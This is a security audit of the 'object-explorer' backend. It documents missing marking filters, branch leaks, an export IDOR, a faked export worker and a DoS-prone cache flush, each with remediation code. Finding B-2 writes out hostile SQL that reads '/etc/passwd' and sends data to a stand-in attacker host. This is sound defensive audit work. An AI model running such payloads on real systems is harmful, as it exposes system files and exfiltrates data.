# Audit — `object-explorer` (Tellus backend) — Detailed Edition

> Voice: 20-year backend engineer. Forensic reading of code, no hand-waving, evidence cited at file:line, attack scenarios spelled out, remediations specified at the level a senior could implement in one sitting without further design.

---

## 1. Executive Summary

This codebase has the architectural shape of a Palantir-style ontology platform that was built right where it counts — and stops being built right at the edges. The hot read path (`POST /api/v1/objects/:objectType/search`, `searchFullText`, `aggregate`, `GET /:primaryKey`, `GET /:primaryKey/links/:linkType`) is the work of someone who has been burned before: there is a single canonical `injectSecurityFilter` (`src/services/opensearch/client.ts:223-260`) that ANDs `securityFilter` plus the F-P3-13 `__branch` clause onto every body before the query leaves Node; a fail-closed `requireSecurityContext` (`src/middleware/securityContext.ts:138-148`) so a bug in middleware ordering can't silently produce an unfiltered query; a post-fetch re-search after `client.get` (`src/services/queryExecutor.ts:131-181`) because `_doc/{id}` GETs in OpenSearch bypass query-level filters and an attacker who knows the PK would otherwise IDOR around the marking model. These are not patterns one writes the first time; they are scar tissue.

The other half of the surface — the Charts, SQL, Comparisons, Summary, Explorations, Exports, and Favorites routes — was written by someone (or by the same someone in a hurry) who treated those endpoints as cosmetic. They reach into Postgres directly, they invent a parallel `wrapWithSecurity` lambda instead of calling the canonical helper, they fake worker-pipeline state in the request handler, and they fall back to a string `"system"` userId when authentication is unset.

The platform is not production-ready under a 99.9% SLO with audit obligations. It is roughly three engineering weeks away from being credibly so, *if* the fixes outlined in §7 are taken in the order given. The branch-isolation leak via the overlay (Finding H-5) is the only one that requires a schema change. Everything else is local to a single file.

**Top 3 blockers:**
1. Aggregation surface (`/charts`, `/sql`, `/comparisons/aggregate`) bypasses Markings/CBAC/branch enforcement.
2. `/exports/:jobId` IDOR + state-machine fakery (no real export worker).
3. Writeback overlay is branch-unaware, leaking edits across branches for the TTL window.

**Top 3 quick wins:**
1. Substitute `injectSecurityFilter(body, secFilter, branchId)` for `wrapWithSecurity` in `routes/comparisons.ts:79-95` and `routes/charts.ts:96-196`. Remove the four PG-backed chart endpoints (`charts.ts:36-78`).
2. Add `WHERE requested_by = $userId` to the SELECT/UPDATE in `routes/exports.ts:88-110`. Strip the per-poll status-tick fakery.
3. Restrict `POST /api/v1/sql/invalidate` (`routes/sql.ts:42-46`) to `role:"ontology-admin"` and require `ontologyId`.

---

## 2. Module Map

There is no `object-explorer` module in this repo. The "Object Explorer" is a frontend product surface (defined at `tellus-fe/ontology/ontology-object explorer.md`, 390 lines, 120 numbered features). On the backend it decomposes across nine route files in `src/routes/` plus the `services/` they delegate into.

| Module (logical) | Purpose | Key files | Public API surface |
|---|---|---|---|
| object-explorer / Search & Get | List, search, full-text, get-by-PK, link traversal | `src/routes/objects.ts:1-916`, `src/services/queryExecutor.ts:1-408`, `src/services/queryValidator.ts:1-692`, `src/services/queryTranslator.ts:1-421`, `src/services/paginationService.ts`, `src/services/objectResponseFormatter.ts` | 9 endpoints under `/api/v1/objects/:objectType/...` (`server.ts:571`) |
| object-explorer / Object View | Enriched per-object UI payload + linked summaries | `src/routes/objectViews.ts:1-755`, `src/services/propertyMetadataService.ts` | Mounted at `/api/v1/ontology/:ontologyId/objectTypes/:objectTypeApiName` (`server.ts:566`) and `/api/v1/objects/:objectType` (`server.ts:570`) |
| object-explorer / Charts | Listogram / histogram / date-histogram / auto-charts | `src/routes/charts.ts:1-198`, `src/services/polarsAggregator.ts` | `/api/v1/charts/{listogram,histogram,dateHistogram,auto,batch}` (`server.ts:592`) |
| object-explorer / SQL | "Analyze Using SQL" beta (DuckDB-backed Furnace) | `src/routes/sql.ts:1-48`, `src/services/furnaceSqlService.ts:1-245` | `POST /api/v1/sql`, `POST /api/v1/sql/invalidate` (`server.ts:591`) |
| object-explorer / Summary | Home page bundle + per-type summary card | `src/routes/summary.ts:1-71` | Under `/api/v1/ontology/:ontologyId/summary` (`server.ts:583`) |
| object-explorer / Comparisons | Dual-set aggregation | `src/routes/comparisons.ts:1-130` | `POST /api/v1/ontology/:id/comparisons/aggregate` (`server.ts:585`) |
| object-explorer / Explorations | CRUD on saved explorations | `src/routes/explorations.ts:1-127` | `/api/v1/ontology/:id/explorations` (`server.ts:581`) |
| object-explorer / Exports | Async export job submission + polling | `src/routes/exports.ts:1-116` | `/api/v1/ontology/:id/exports` (`server.ts:582`) |
| object-explorer / Favorites & Recents | User-scoped favorites + recent-activity log | `src/routes/favorites.ts:1-119` | `/api/v1/users/me/favorites` (`server.ts:588`) |
| ontology-manager | Ontology CRUD + branch resolution | `src/routes/ontology.ts:1-268`, `src/routes/branches.ts:1-359`, `src/services/ontologyService.ts`, `src/services/branchContext.ts:1-162` | `ontologyRouter` mounted at `server.ts:482`; branches at `server.ts:578` |
| object-types | Object type CRUD + property registry + interface mapping | `src/routes/objectTypes.ts:1-592`, `src/routes/properties.ts`, `src/routes/objectTypeInterfaces.ts`, `src/services/objectTypeService.ts`, `src/services/propertyService.ts`, `src/services/propertyResolver.ts`, `src/services/interfaceQueryService.ts` | `/api/v1/ontology/:ontologyId/objectTypes/...` (`server.ts:483-505`) |
| link-types | Link type CRUD + traversal services | `src/routes/links.ts:1-1545`, `src/services/linkResolverService.ts:1-1399`, `src/services/linkCycleDetection.ts:1-60`, `src/services/linkCardinalityEstimator.ts`, `src/services/linkPagination.ts`, `src/services/linkDirectionHelpers.ts` | `/api/v1/ontology/:ontologyId/linkTypes` (`server.ts:506`) |
| Cross-cutting (auth, branch, security) | JWT verify + PAT scope + marking extraction + branch UUID resolution | `src/middleware/globalAuth.ts:1-260+`, `src/middleware/patSecurityGate.ts`, `src/middleware/securityContext.ts:1-289`, `src/middleware/branchHeader.ts:1-45`, `src/services/branchContext.ts:1-162` | Wired in order at `src/server.ts:315 → 349 → 362` |

---

## 3. Endpoint Inventory

| Method | Path | Handler | Auth | Validation | Security filter | Branch filter | Status |
|---|---|---|---|---|---|---|---|
| POST | `/api/v1/objects/:objectType/search` | `routes/objects.ts:159-251` | globalAuth + securityContext | `validateSearchQuery` | yes | yes | OK |
| POST | `/api/v1/objects/:objectType/searchFullText` | `routes/objects.ts:255-307` | yes | inline | yes | yes | OK |
| POST | `/api/v1/objects/:objectType/aggregate` | uses `executeAggregate` | yes | `validateAggregateQuery` | yes | yes | OK |
| POST | `/api/v1/objects/:objectType/searchAround` | `routes/objects.ts:200+` | yes | inline | yes | yes | OK |
| GET | `/api/v1/objects/:objectType` | list handler | yes | `validateListQuery` | yes | yes | OK |
| GET | `/api/v1/objects/:objectType/:primaryKey` | tail of `objects.ts:500-916` | yes | path | yes | yes | OK; column-strip swallows errors (M-15-adj) |
| POST | `/api/v1/objects/:objectType/validateForeignKeys` | `routes/objects.ts:382-414` | yes | inline | yes | yes | OK |
| GET | `/api/v1/objects/:objectType/:primaryKey/links/:linkType` | `routes/objects.ts:421-498` | yes | inline | yes | yes | OK |
| GET | `/api/v1/objects/:objectType/:primaryKey/links/:linkType/count` | `routes/objects.ts:499-549` | yes | inline | yes | yes | OK |
| GET | `/api/v1/objects/:objectType/:primaryKey/editHistory` | `objects.ts ~:580` | yes | inline | unverified | not threaded | unaudited |
| POST | `/api/v1/ontology/.../batchView` | `routes/objectViews.ts:200-296` | yes | cap 100 | yes | NOT passed | branch leak (H-7) |
| GET | `/api/v1/objects/:objectType/:primaryKey/view` | `routes/objectViews.ts:528-560` | yes | path | yes | yes | OK |
| GET | `/api/v1/objects/:objectType/:primaryKey/linked` | `routes/objectViews.ts:564-650` | yes | clamp | yes | delegated | OK |
| POST | `/api/v1/objects/:objectType/batchView` | `routes/objectViews.ts:660-754` | yes | cap 100 | yes | NOT passed | branch leak (H-7) |
| POST | `/api/v1/charts/listogram` | `routes/charts.ts:36-44` | globalAuth | none | NONE | NONE | BLOCKER (B-1) |
| POST | `/api/v1/charts/histogram` | `routes/charts.ts:46-54` | globalAuth | none | NONE | NONE | BLOCKER (B-1) |
| POST | `/api/v1/charts/dateHistogram` | `routes/charts.ts:56-64` | globalAuth | none | NONE | NONE | BLOCKER (B-1) |
| POST | `/api/v1/charts/auto` | `routes/charts.ts:66-78` | globalAuth | inline | NONE | NONE | BLOCKER (B-1) |
| POST | `/api/v1/charts/batch` | `routes/charts.ts:96-196` | globalAuth | inline | partial | NONE | High (B-3) |
| POST | `/api/v1/sql` | `routes/sql.ts:14-40` | globalAuth | length + read-only | NONE | NONE | BLOCKER (B-2) |
| POST | `/api/v1/sql/invalidate` | `routes/sql.ts:42-46` | globalAuth | none | n/a | n/a | DoS (H-9) |
| GET | `/api/v1/ontology/:ontologyId/summary` | `routes/summary.ts:36-67` | globalAuth | none | NONE | NONE | High (H-6) |
| GET | `/api/v1/ontology/:ontologyId/summary/:apiName` | `routes/summary.ts:17-32` | globalAuth | path | NONE | NONE | Medium |
| POST | `/api/v1/ontology/:ontologyId/comparisons/aggregate` | `routes/comparisons.ts:34-118` | globalAuth | inline | partial | NONE | High (B-3) |
| CRUD | `/api/v1/ontology/:ontologyId/explorations[/...]` | `routes/explorations.ts:27-122` | globalAuth | inline | n/a | n/a | Medium (M-16) |
| POST | `/api/v1/ontology/:ontologyId/exports` | `routes/exports.ts:65-86` | globalAuth | format | n/a | n/a | High (H-4) |
| GET | `/api/v1/ontology/:ontologyId/exports/:jobId` | `routes/exports.ts:88-110` | globalAuth | path | n/a | n/a | High — IDOR + fakery (H-4) |
| CRUD | `/api/v1/users/me/favorites/...` | `routes/favorites.ts:29-118` | globalAuth | inline | n/a | n/a | Medium (M-17) |

---

## 4. Dependency Graph

```
                                ┌────────────────────────────────────┐
                                │      object-explorer (logical)     │
                                │  routes/{objects, objectViews,     │
                                │  charts, sql, summary, comparisons,│
                                │  explorations, exports, favorites} │
                                └────┬──────────────┬────────────────┘
                                     │              │
   direct import (in-process)        │              │ direct import
                                     ▼              ▼
                         ┌──────────────────┐   ┌──────────────────────────┐
                         │ ontology-manager │   │ object-types             │
                         │  routes/ontology │   │  routes/objectTypes      │
                         │  routes/branches │   │  routes/properties       │
                         │  services/       │   │  services/objectType*    │
                         │   branchContext  │   │  services/propertyResolver│
                         │   ontologyService│   │  models/objectType       │
                         └────┬─────────────┘   └────────┬─────────────────┘
                              │                          │
                              ▼                          ▼
                         ┌──────────────────┐    ┌──────────────────────┐
                         │   ontology_branch│    │ link-types           │
                         │   ontology       │    │  routes/links        │
                         └──────────────────┘    │  services/linkResolver│
                                                 │  services/linkCycle  │
                                                 │  models/linkType     │
                                                 └──────────────────────┘

   Shared in-process / implicit contracts:
   - opensearch client singleton (services/opensearch/client.ts)
   - in-memory branchContext mainBranchCache (branchContext.ts:50)
   - in-memory FurnaceSql DuckDB CACHE (furnaceSqlService.ts:38)
   - in-memory overlay store handle (services/overlay/getOverlayStore.ts)
```

**Notable leaks:**
- `routes/objects.ts:14-41` reaches directly into the OpenSearch client, the overlay, and the funnel metrics emitter — not a clean facade.
- `furnaceSqlService.ts:60-100` reads `object_type` and `object_instances` directly from PG, completely bypassing the object-types service and the OpenSearch index.
- `routes/sql.ts:42-46`'s `/sql/invalidate` is a process-global cache mutation reachable by any authenticated user.

---

## 5. Requirements Traceability Matrix

> Source: `tellus-fe/ontology/ontology-object explorer.md` (Part 2: Object Explorer, features 61–120). Backend acceptance criteria also referenced from `tasks/Funnel-pipeline/tasks-02.md`.

| # | Requirement | Status | Evidence | Gap |
|---|---|---|---|---|
| 61 | Home Page Hub bundle | Partial | `summary.ts:36-67` | No security filter; `userId="system"` fallback |
| 62 | Object type groups (visual grid) | Partial | `summary.ts:46-49` | No group→type membership join; no per-type counts |
| 63 | Group graph viz | Missing | — | None |
| 64 | Object type preview card | Implemented | `summary.ts:17-32` | None |
| 65 | Cross-ontology search | Diverged | `routes/search.ts:1-16` (Foundry only) | No unified ontology search |
| 66 | Type-ahead | Diverged | `routes/search.ts` | No ontology type-ahead |
| 67 | Faceted results page | Missing | — | — |
| 68–71 | Boolean / wildcards / fuzzy / phrase syntax | Partial | `queryExecutor.ts:288-360` | No Lucene syntax parsing |
| 72 | Object-hover link exploration | Implemented | `objects.ts:421-498`, `objectViews.ts:564-650` | None |
| 73 | Auto-charts per prominent property | Diverged | `charts.ts:36-78` (PG) vs `charts.ts:96-196` (OS) | Two implementations, drift |
| 74–78 | Listogram / histogram / date hist / geohash / choropleth | Partial | listogram/histogram/dateHistogram via Polars | Geo charts missing; Polars path insecure |
| 79 | Linked-object filtering in charts | Missing | — | — |
| 80–82 | Drag-reorder / resize / undo-redo | Frontend | — | — |
| 83 | Search-bar filter builder | Implemented | `objects.ts:179-205` | None |
| 84 | Preview cards in sidebar | Partial | `objectViews.ts batchView` | Cap is 100 not "first 20" |
| 85 | Infinite-scroll table | Implemented | `paginationService.ts` + `search_after` | `MAX_PAGE_SIZE=10000` (L-23) |
| 86–89 | Sorting / reorder / freeze / visibility | Partial | `$orderBy` validated | Layout state not persisted |
| 90 | Selection preview panel | Implemented | `objectViews.ts batchView` | None |
| 91 | Compare two objects | Missing | — | No diff endpoint |
| 92 | Inline property editing | Implemented (write-side) | actionsRouter, editsRouter | Not deeply audited |
| 93 | Time series in table | Missing | — | Not wired |
| 94–95 | Value / conditional formatting | Frontend | — | — |
| 96 | Default object view | Implemented | `objectViews.ts:163-230` | None |
| 97–104 | Custom view, full vs panel, widgets | Missing | — | — |
| 105–108 | Comparison views | Partial | `comparisons.ts:34-118` | Branch leak (B-3); save/share absent |
| 109 | Actions dropdown | Implemented | actionsRouter | Unaudited |
| 110 | Open-In menu | Missing | — | — |
| 111 | Export to CSV/XLSX | **Missing (claimed Implemented)** | `exports.ts:65-110` | Worker stub fabricates URLs (H-4) |
| 112 | Dynamic object sets | Missing | — | — |
| 113 | Success toast deep link | Frontend | — | — |
| 114 | Save exploration | Implemented | `explorations.ts:27-52` | No row-level marking |
| 115 | Revisit exploration | Implemented | `explorations.ts:71-83` | None |
| 116 | Save layout | Diverged | only `saved_exploration` | No `saved_layout` table |
| 117–118 | Personal / global default layout | Missing | — | — |
| 119 | Analyze using SQL (1000 row cap) | Partial | `furnaceSqlService.ts:163-181` | No security; no statement timeout (B-2) |
| 120 | Furnace SQL via Calcite + Arrow Flight | Diverged | DuckDB substitution | Acceptable; no Arrow Flight surface |
| F-P3-13 | Branch isolation on read path | Partial | objects.ts/objectViews.ts/queryExecutor | Not threaded through charts/sql/summary/comparisons/explorations/exports/favorites/batchView |
| F-03 | Mandatory marking filter injection | Partial | `injectSecurityFilter` | Bypassed by charts/sql/comparisons/summary |
| Tasks-02 §B7 | "Edit visible immediately on Explorer refresh" | Implemented (with leak) | `objects.ts:60-89` | Branch-unaware overlay (H-5) |

---

## 6. Findings

### 6.1 Blockers

#### B-1. Charts endpoints bypass Markings/CBAC entirely.

**Code:** `src/routes/charts.ts:25-78`.

**What it does in production.** A user with empty markings calls `POST /api/v1/charts/auto` with `{ ontologyId, objectType: "employee", fields: [{field: "salary"}] }`. The handler calls `loadObjectRows(ontologyId, "employee")` (`charts.ts:25-34`) which runs an unfiltered `SELECT properties_json FROM object_instances WHERE object_type_id = … LIMIT 5000` against PG. Polars histograms the JSON. The response is the full distribution of `salary` — including rows flagged `_security.markings = ['SECRET']` in the OpenSearch index.

**How introduced.** The four endpoints (`/listogram`, `/histogram`, `/dateHistogram`, `/auto`) predate `/charts/batch`. They were a "demo-grade, no opensearch dependency" implementation. When `/charts/batch` was added with the spec's contract, the four legacy handlers were left in place.

**How an auditor sees it.** Two test accounts (`secret_alice` with `markings:['SECRET']` and `none_bob` with `markings:[]`) hit `/charts/auto` for the same `objectType` and get identical histograms. 90-second test.

**Fix.** Delete the four legacy endpoints; route through `/charts/batch`. If the frontend coupling forbids deletion:

```ts
async function loadObjectRows(
  objectType: string,
  securityFilter: Record<string, unknown> | null | undefined,
  branchId: string | null,
): Promise<Record<string, unknown>[]> {
  const index = getIndexName(objectType);
  const body = injectSecurityFilter(
    { size: 5000, query: { match_all: {} }, _source: true },
    securityFilter,
    branchId,
  );
  const { body: result } = await client.search({ index, body });
  return (result.hits?.hits ?? []).map((h: any) => h._source ?? {});
}
```

The `LIMIT 5000` sampling is a separate semantics bug: a histogram over an arbitrary 5000-row sample (no `ORDER BY`) is statistically meaningless on populations of any size. The OpenSearch terms/histogram aggregation in `/charts/batch` solves both bugs.

#### B-2. `/api/v1/sql` evaluates user SQL with no row- or column-level security.

**Code:** `src/routes/sql.ts:14-40`, `src/services/furnaceSqlService.ts:43-238`.

**What it does in production.** A user with empty markings calls `/api/v1/sql` with `SELECT data->>'salary' FROM employee`. The Furnace service builds an in-memory DuckDB image from `SELECT primary_key_value, properties_json FROM object_instances LIMIT 5000` per object type (`furnaceSqlService.ts:71-94`) — every row, regardless of marking. The user's SQL runs against that image. Every salary returns. The DuckDB is cached for 30s keyed on `ontologyId` only — one user's hit warms the cache for the next.

**Compounding bug — AST-blind read-only.** `firstKeyword` (`furnaceSqlService.ts:139-180`) checks the leading SQL keyword. `SELECT * FROM read_csv_auto('/etc/passwd')` is a SELECT and passes. `SELECT * FROM read_json_auto('https://attacker.example/?data=' || …)` uses the httpfs extension (auto-loaded at `:55`) for live exfiltration via DNS-encoded query strings. PRAGMA is on the allowlist (`:135`).

**Compounding bug — missing statement timeout.** Docstring at `:7-15` claims a 10s timeout. Implementation (`:115-119`) is `db.all(sql, callback)` with no timeout. A `WITH RECURSIVE` of the right shape pins a libuv worker indefinitely.

**Fix.** Three layers:
1. Replace the PG dump in `getDb` with an OpenSearch-source dump that applies `injectSecurityFilter`. Cache by `(ontologyId, sha256(buildSecurityFilter(ctx)), branchId)`.
2. `SET enable_external_access=false; SET disable_external_extensions=true; SET allow_unsigned_extensions=false;` at DB creation. Drop `pragma` from `ALLOWED_LEADING`.
3. Wrap `db.all` in `Promise.race` with a 10s deadline; call `db.interrupt()` on timeout. `PRAGMA threads = 2`.

#### B-3. Comparison aggregations omit branch isolation; security wrapping is ad-hoc.

**Code:** `src/routes/comparisons.ts:79-95`.

**What it does.** Line `:79-87` defines `wrapWithSecurity(q) = security ? { bool: { must: [q, security] } } : q`. The `__branch` clause that `injectSecurityFilter` would add is missing. A user on branch B comparing two filtered sets is comparing across every branch in the tenant.

**Fix.** Refactor `injectSecurityFilter` to take a *query* (not a *body*) and apply the AND-wrap, returning a query:

```ts
export function applyContextToQuery(
  query: Record<string, unknown>,
  securityFilter: Record<string, unknown> | null | undefined,
  branchId: string | null,
): Record<string, unknown> {
  const clauses: Record<string, unknown>[] = [query];
  if (securityFilter) clauses.push(securityFilter);
  if (typeof branchId === "string" && branchId.length > 0) {
    clauses.push({
      bool: {
        should: [
          { term: { __branch: branchId } },
          { bool: { must_not: [{ exists: { field: "__branch" } }] } },
        ],
        minimum_should_match: 1,
      },
    });
  }
  return clauses.length === 1 ? query : { bool: { must: clauses } };
}
```

`injectSecurityFilter(body, sec, branch)` becomes a one-liner that calls `applyContextToQuery`. `comparisons.ts` and `charts.ts` use `applyContextToQuery` directly inside their `_msearch` builders.

### 6.2 High

#### H-4. Export pipeline is a stub with IDOR.

**Code:** `src/routes/exports.ts:88-110`.

```ts
router.get("/:jobId", async (req, res, next) => {
  const result = await query("SELECT * FROM export_job WHERE job_id = $1", [req.params.jobId]);
  // ... no requested_by check
  if (row.status === "PENDING") {
    await query("UPDATE export_job SET status = 'RUNNING' …", [row.job_id]);
  } else if (row.status === "RUNNING") {
    const downloadToken = crypto.randomUUID();
    await query("UPDATE export_job SET status = 'COMPLETED', download_url = $4 …",
                [row.job_id, …, `/exports/${downloadToken}.${row.format}`, expires]);
  }
  sendSuccess(res, row);
});
```

Two bugs: (1) IDOR — any authenticated user reads/mutates any other user's job. (2) Worker stub — no real worker; `download_url` points nowhere; clicking download returns 404. The comment at `:97-99` admits: *"Tick the job forward on each poll so tests see a happy-path without needing a real worker."*

**Fix.**
1. Add `AND requested_by = $userId` to all SELECT/UPDATE.
2. Build a Temporal activity that reads the job, calls `executeSearch` with the requester's stored security context, streams to CSV/XLSX/JSONL via `services/storageService.ts`, writes `download_url`. The codebase already uses Temporal (`server.ts:96`).

#### H-5. Writeback overlay is branch-unaware.

**Code:** `src/services/overlay/writebackOverlay.ts:181-228, 280-300` and `src/routes/objects.ts:60-89, 519-540`.

**What it does.** Overlay key is `overlay:${objectType}:${primaryKey}`. `OverlayRecord` has no branch field. An edit on branch B is in the overlay; a read on branch A picks it up via `applyOverlayToResults`. F-P3-13 branch isolation is violated for the overlay TTL window (~seconds to minutes, depending on Quickwit/OpenSearch absorption lag).

**Fix.** Lockstep migration:
1. Add `branchId: string` to `OverlayRecord`.
2. Change keyspace to `overlay:${branchId}:${objectType}:${pk}`.
3. Thread `branchId` through `mergeWithOverlay`, `applyOverlayToResults`, `mergeOverlayIntoSearch`, `collectFilterMatchingOverlays`. Reject overlay reads where `record.branchId !== requestedBranchId`.

Deploy plan: read-side reads both old+new keys preferring new → write-side writes both → bake one TTL → write-side stops old → read-side stops old.

#### H-6. Summary handler has no security context and falls back to `"system"`.

**Code:** `src/routes/summary.ts:36-67`.

**What it does.** Line `:39`: `const userId = (req as any).user?.id || "system"`. Lines `:43-66`: four parallel PG queries returning the home-page bundle. No marking predicate, no visibility predicate (spec §16). Bugs:
- No marking enforcement on `object_type` / `object_type_group`. Existence of a sensitive type leaks.
- `|| "system"` fallback. If `req.user` is ever absent (regression in globalAuth allowlist or claim shape), favorites/recents query returns rows keyed on literal `"system"`. Same fallback in `routes/favorites.ts:25-27`, so write-side can produce such rows.

**Fix.**
```ts
function currentUser(req: Request): string {
  const id = (req as any).user?.id;
  if (!id) throw appError("UNAUTHORIZED", "Missing user context.");
  return id;
}
```
Replace `|| "system"` in `summary.ts:39`, `explorations.ts:23-25`, `exports.ts:60-62`, `favorites.ts:25-27`. Filter `object_type` by user's marking set.

#### H-7. `objectViews.ts:batchView` does not propagate `branchId`.

**Code:** `src/routes/objectViews.ts:200-296, 660-754`.

**What it does.** Single-object handlers at `:528-560` and `:564-650` thread `branchId`. Both `batchView` handlers don't. `buildObjectView` defaults `branchId = null` (`:181`), which `injectSecurityFilter` interprets as "explicit cross-branch read." A batch view of 50 PKs returns rows from every branch.

**Fix.**
```ts
const branchId = readBranchHeader(req);
incCounter("tellus_read_branch_filtered_total", { route: "objectViews.batch", scoped: String(branchId !== null) });
```
Pass `branchId` as the seventh argument to `buildObjectView`.

#### H-8. `/api/v1/sql` lacks the statement timeout the docstring promises.

(Combined with B-2.)

#### H-9. `/api/v1/sql/invalidate` is unrestricted DoS surface.

**Code:** `src/routes/sql.ts:42-46`.

Any authenticated user flushes the process-global DuckDB cache. Each rebuild is `N × SELECT … LIMIT 5000` per object type. A 10x/sec loop in a browser console saturates PG connection pool slots.

**Fix.**
1. Require `role = "ontology-admin"`.
2. Require `ontologyId`. 400 on missing.
3. Per-ontology rate limit 1/min.
4. Audit log entry.
5. Better: drop the HTTP endpoint; call `invalidateFurnaceCache` in-process from write hooks.

#### H-10. `ensureObjectTypeExists` enumerates the entire ontology in 404 messages.

**Code:** `src/routes/objects.ts:122-132`.

`Object type 'foo' not found. Available object types: emp, hr, payroll, patient_record, tax_audit_target, …` enumerates the full type catalog, including types whose names are sensitive. The same file enforces the opposite discipline at `:867-872`.

**Fix.**
```ts
async function ensureObjectTypeExists(objectType: string): Promise<void> {
  const result = await query("SELECT 1 FROM object_type WHERE api_name = $1", [objectType]);
  if (result.rows.length === 0) {
    const debug = process.env.NODE_ENV !== "production";
    const msg = debug
      ? `Object type '${objectType}' not found. (Hint: check api_name spelling.)`
      : `Object type not found.`;
    throw appError("OBJECT_TYPE_NOT_FOUND", msg);
  }
}
```

#### H-11. Two response envelopes coexist; error code vocabulary is fragmented.

Four envelope shapes in use:
- `routes/sql.ts`, `routes/charts.ts`: `{success, error: {code, message}}`.
- `routes/objects.ts`, `routes/objectViews.ts`: `{error: {code, message}}` only.
- `utils/responseFormatter.ts` (`sendError` consumed in summary/comparisons/explorations/exports/favorites): a third shape.
- `server.ts:217-244`, `globalAuth.ts:160-178`: `{errorCode, errorName, message, statusCode, requestId, error: {code, message}}`.

Vocabulary: `CHART_ERROR`, `SQL_ERROR`, `QUERY_VALIDATION_ERROR`, `VALIDATION_ERROR`, `VALIDATION_FAILED`, `NOT_FOUND`, `OBJECT_TYPE_NOT_FOUND`, `OBJECT_NOT_FOUND`, `LINK_TYPE_NOT_FOUND`, `OPENSEARCH_ERROR`, `INVALID_PAGE_TOKEN`, `INCOMPATIBLE_FILTER`, `PROPERTY_NOT_FOUND`, `MALFORMED_JSON`, `PAYLOAD_TOO_LARGE`, `RATE_LIMITED`, `UNAUTHORIZED`, `SQL_WRITE_REJECTED`, `DUCKDB_UNAVAILABLE`, `LINK_CYCLE_DETECTED`. `VALIDATION_ERROR` and `VALIDATION_FAILED` are duplicates; `NOT_FOUND` is `OBJECT_NOT_FOUND` in disguise; `CHART_ERROR`/`SQL_ERROR` are non-actionable.

**Fix.**
1. Pick the `server.ts:217-244` envelope; centralize through `sendError`.
2. Document a single vocabulary in `src/utils/errors.ts`. Drop `CHART_ERROR`, `SQL_ERROR`, `VALIDATION_FAILED`, `NOT_FOUND`, `LINK_CYCLE_DETECTED` (subsume into `VALIDATION_ERROR`).
3. Add missing codes to per-route `KNOWN_CODES` whitelists. `objects.ts:118-126` lacks `LINK_TYPE_NOT_FOUND`.

### 6.3 Medium

#### M-12. Two implementations of the same primitive (PG/Polars vs OpenSearch).

`charts.ts:36-78` (Polars, 5000-row unsorted sample) and `charts.ts:96-196` (OpenSearch `_msearch`). Different security, different bucketing. Frontend cannot tell which it called. Pick one. Effort: 2 hours.

#### M-13. Full-text search does not implement spec syntax.

`queryExecutor.ts:288-360` uses `multi_match cross_fields/best_fields fuzziness:AUTO`. Spec §68-71 syntax (`AND`/`OR`/`NOT`, `*`/`?`, `~`, `"…"`) is treated as literal text. Power users typing the documented syntax get *worse* results than naive users.

**Fix.** Add a third `should` clause:
```ts
const SPEC_SYNTAX_RE = /[~*?"]|\b(AND|OR|NOT)\b|[()]/;
if (SPEC_SYNTAX_RE.test(searchText)) {
  shouldClauses.push({ query_string: { query: searchText, fields: textFields, default_operator: "AND", analyze_wildcard: false } });
}
```

#### M-14. Filter operator translation drift.

`routes/objects.ts:179-205`'s `OP_MAP` maps `exists` → `isNotNull` and `notExists` → `isNull`. OpenSearch `exists: {field}` tests field presence (different from value-non-null on sparse JSON). Pick a model and document.

#### M-15. `KNOWN_CODES` whitelist drift.

`objects.ts:118-126` lacks `LINK_TYPE_NOT_FOUND` but throws it at `:339, :464, :517`. `handleError` falls through to `next(err)`, returning a 5xx envelope for what should be a 404. Add the codes; centralize per H-11.

#### M-16. Saved explorations have no row-level marking.

`explorations.ts:55-66`. `visibility IN ('shared','public') OR owner_id = $2`. The `config: jsonb` reveals the structure of filtered queries on SECRET data. GET single-exploration at `:71-83` has no visibility check at all.

**Fix.** Tag explorations at write time with required marking-set; filter by `(required_markings ⊆ user_markings)`.

#### M-17. `"system"` userId fallback in four files.

(Combined with H-6.)

#### M-18. DuckDB cache concurrency race.

`furnaceSqlService.ts:38-39`. `const CACHE: Record<string, CachedDb> = {};` with no per-key mutex. Two concurrent misses both rebuild.

**Fix.**
```ts
const PENDING: Map<string, Promise<Database>> = new Map();
async function getDb(ontologyId: string): Promise<Database> {
  const cached = CACHE[ontologyId];
  if (cached && Date.now() - cached.loadedAt < CACHE_TTL_MS) return cached.db;
  const inflight = PENDING.get(ontologyId);
  if (inflight) return inflight;
  const promise = (async () => {
    try {
      const db = /* … existing build logic … */;
      CACHE[ontologyId] = { db, loadedAt: Date.now() };
      return db;
    } finally { PENDING.delete(ontologyId); }
  })();
  PENDING.set(ontologyId, promise);
  return promise;
}
```

#### M-19. Multi-hop traversal does not dedup across hops.

`linkResolverService.ts:805-880` (`resolveMultiHop`). `nextPKs: Set<string>` is per-hop. Data-level cycles re-traverse instances 5x against the `MAX_INTERMEDIATE = 100000` cap. Inner loop is sequential — N round trips per hop.

**Fix.**
```ts
const visitedPKs = new Set<string>(startingPKs);
for (let i = 0; i < steps.length; i++) {
  const newPKs = new Set<string>();
  for (const chunk of chunked(currentPKs, 50)) {
    const results = await Promise.all(chunk.map(pk => resolveLinks(linkType, pk, step.direction, …)));
    for (const result of results) for (const obj of result.linkedObjects) {
      const pk = String(obj.__pk ?? "");
      if (!visitedPKs.has(pk)) { newPKs.add(pk); visitedPKs.add(pk); }
    }
  }
  currentPKs = Array.from(newPKs).slice(0, MAX_INTERMEDIATE);
}
```

#### M-20. Uneven observability across the explorer surface.

`objects.ts`/`objectViews.ts` increment `tellus_read_branch_filtered_total`; `charts.ts`, `sql.ts`, `comparisons.ts`, `summary.ts`, `explorations.ts`, `exports.ts`, `favorites.ts` don't. Trace context exists but `console.log` lines don't include trace id.

**Fix.** Standardize a `routeMetric(req, route, branchId)` and `routeLog(req, route, status, ms, extras)` helper; CI rule that every OpenSearch-reading route calls them.

#### M-21. Ontology alias rewriter uncached and silent on failure.

`server.ts:464-481`. PG SELECT per request; cache at boot with 30s refresh; emit alias-resolution counter; fail loudly with `ALIAS_RESOLUTION_FAILED`.

#### M-22. Read-only SQL guard is keyword-based.

(Combined with B-2.)

### 6.4 Low

#### L-23. `MAX_PAGE_SIZE = 10000` is generous for "infinite scroll."

10000 rows × 1KB JSON = 10MB+ response. Drop default to 1000.

#### L-24. Hardcoded palette in `comparisons.ts:30-33` is dead.

Either include in response or remove.

#### L-25. Overlay version monotonicity not enforced at write.

`writebackOverlay.ts:212-218` has the read-side stale guard. Write side does not enforce monotonic version. Compare-and-swap on `version`.

#### L-26. Dead code / TODO debt.

- `queryExecutor.ts:402-407`: stub self-test.
- `linkResolverService.ts:1334`: `runSelfTests()` similarly.
- `comparisons.ts:30-33`: dead palette.
